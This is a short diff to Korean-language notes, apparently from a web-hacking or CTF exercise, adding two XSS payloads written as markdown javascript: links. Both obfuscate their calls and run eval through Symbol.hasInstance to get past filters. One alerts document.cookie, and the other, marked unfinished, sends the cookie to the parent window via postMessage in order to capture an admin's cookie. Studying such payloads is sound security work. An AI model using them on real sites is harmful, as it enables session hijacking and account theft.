@@ -14,6 +14,11 @@
 
 -> 해결방안(아직 못해봄) window.postmessage를 이용해서 parent화면에 message출력하게 하면 내 화면에 관리자의 쿠키가 나올 수 있겠구나
 
+지금까지 작성된 payload a는 쿠키 출력 b는 postmessage를 이용(미완...)
+[a](javascript:/alert/.source+[URL+[]][0][12]+/document.cookie/.source+[URL+[]][0][13] instanceof{[Symbol.hasInstance]:eval};)
+[b](javascript:/parent.postMessage/.source+[URL+[]][0][12]+/document.cookie/.source+[URL+[]][0][13] instanceof{[Symbol.hasInstance]:eval};)
+
+
 <br>
 P.S.
 
